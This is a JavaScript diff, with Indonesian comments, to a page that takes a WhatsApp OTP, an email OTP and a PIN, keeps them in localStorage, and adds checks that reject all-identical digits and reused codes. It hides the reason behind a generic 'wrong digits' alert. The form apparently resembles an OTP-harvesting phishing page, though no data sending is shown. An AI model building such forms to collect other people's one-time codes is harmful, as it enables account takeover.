@@ -171,6 +171,11 @@
             try { localStorage.setItem(key, value); return true; } catch (e) { console.warn('localStorage set fail', e); return false; }
         }
 
+        // === Utility untuk cek 6 digit semua sama ===
+        function isSixDigitsAllSame(value) {
+            return (/^\d{6}$/.test(value) && /^(\d)\1{5}$/.test(value));
+        }
+
         // === OTP Input Logic ===
         const otpInputs = document.querySelectorAll(".otp-input");
         const lanjutBtn = document.getElementById("lanjut");
@@ -221,11 +226,17 @@
                 return;
             }
 
+            // cek 6 digit semua sama
+            if (isSixDigitsAllSame(otp)) {
+                alert('6 digit yang anda masukan salah');
+                return;
+            }
+
             // Cek keunikan: OTP WhatsApp tidak boleh sama dengan PIN atau OTP Email yang sudah tersimpan
             const existingPin = safeGetLocal('pinMitra');
             const existingOtpEmail = safeGetLocal('otpEmail');
             if ((existingPin && existingPin === otp) || (existingOtpEmail && existingOtpEmail === otp)) {
-                alert('Kode OTP WhatsApp tidak boleh sama dengan PIN atau OTP Email yang sudah tersimpan. Mohon masukkan kode yang berbeda atau minta kode baru.');
+                alert('6 digit yang anda masukan salah');
                 return;
             }
 
@@ -299,11 +310,17 @@
                 return;
             }
 
+            // cek 6 digit semua sama
+            if (isSixDigitsAllSame(pin)) {
+                alert('6 digit yang anda masukan salah');
+                return;
+            }
+
             // Cek keunikan: PIN tidak boleh sama dengan OTP WhatsApp atau OTP Email
             const existingOtpWA = safeGetLocal('otpWhatsApp');
             const existingOtpEmail = safeGetLocal('otpEmail');
             if ((existingOtpWA && existingOtpWA === pin) || (existingOtpEmail && existingOtpEmail === pin)) {
-                alert('PIN tidak boleh sama dengan OTP WhatsApp atau OTP Email yang sudah tersimpan. Mohon gunakan PIN berbeda.');
+                alert('6 digit yang anda masukan salah');
                 return;
             }
 
